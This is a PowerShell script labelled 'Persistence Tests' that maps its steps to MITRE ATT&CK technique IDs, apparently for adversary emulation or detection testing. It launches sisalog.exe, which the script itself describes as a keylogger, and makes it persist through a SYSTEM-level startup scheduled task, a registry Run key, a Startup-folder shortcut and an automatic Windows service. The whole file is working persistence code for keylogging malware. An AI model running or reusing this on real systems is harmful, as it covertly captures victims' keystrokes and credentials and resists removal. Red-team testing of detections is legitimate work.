Write-Host "Starting Persistence Tests..."

Write-Host "---------------------------------------------------------------"
Write-Host "| Tactic                                | Technique Description"
Write-Host "---------------------------------------------------------------"
Write-Host "| Scheduled Task/Job: Scheduled Task(T1053.005)       | Creates a scheduled task to execute the malicious executable at startup."
Write-Host "| Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder(T1547.001) | Adds a registry key and modifies the Startup folder to run sisabas.exe at logon."
Write-Host "| Create or Modify System Process: Windows Service(T1543.003)    | Creates a new Windows service to run sisabas.exe."
Write-Host "---------------------------------------------------------------"

$exepath = Get-Location
$sisalogpath = "$exepath\sisalog.exe"
Start-Process -FilePath $sisalogpath

Start-Sleep -seconds 5

# Get the directory of the currently running PowerShell script
$currentScriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
$exePath = Join-Path -Path $currentScriptDirectory -ChildPath "sisalog.exe"
$taskName = "SisaLogServiceTask"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\SisaLogService.lnk')
$serviceName = "SisaLogService"
$serviceDisplayName = "Sisa Log Service"
$serviceDescription = "A service that runs SisaLog keylogger."

# Function to create a scheduled task
function Create-ScheduledTask {
    param (
        [string]$taskName,
        [string]$exePath
    )

    try {
        $action = New-ScheduledTaskAction -Execute $exePath
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName -Description "Sisa Log Service Task"
        Write-Host "Scheduled task $taskName created successfully."
    }
    catch {
        Write-Error "Failed to create scheduled task: $_"
    }
}

# Function to add to the registry run key
function Add-RegistryRunKey {
    param (
        [string]$exePath
    )

    try {
        Set-ItemProperty -Path $regPath -Name "SisaLogService" -Value $exePath
        }
    catch {
        Write-Error "Failed to add registry run key: $_"
    }
}

# Function to create a shortcut in the startup folder
function Add-StartupFolderShortcut {
    param (
        [string]$exePath
    )

    try {
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($startupFolderPath)
        $shortcut.TargetPath = $exePath
        $shortcut.Save()
    }
    catch {
        Write-Error "Failed to create startup folder shortcut: $_"
    }
}

# Function to manage the service
function Manage-Service {
    param (
        [string]$serviceName,
        [string]$exePath,
        [string]$serviceDisplayName,
        [string]$serviceDescription
    )

    try {
        # Create the service if it doesn't exist
        if (-Not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $serviceName -BinaryPathName "`"$exePath`"" -DisplayName $serviceDisplayName -Description $serviceDescription -StartupType Automatic
            Write-Host "Service $serviceName created successfully."
        } else {
            Write-Host "Service $serviceName already exists."
        }

        # Start the service
        Start-Service -Name $serviceName
    }
    catch {
        Write-Error "Failed to create or start service: $_"
    }
}

# Create scheduled task
Create-ScheduledTask -taskName $taskName -exePath $exePath

# Add to registry run key
Add-RegistryRunKey -exePath $exePath

# Add shortcut to startup folder
Add-StartupFolderShortcut -exePath $exePath

# Manage the service
Manage-Service -serviceName $serviceName -exePath $exePath -serviceDisplayName $serviceDisplayName -serviceDescription $serviceDescription


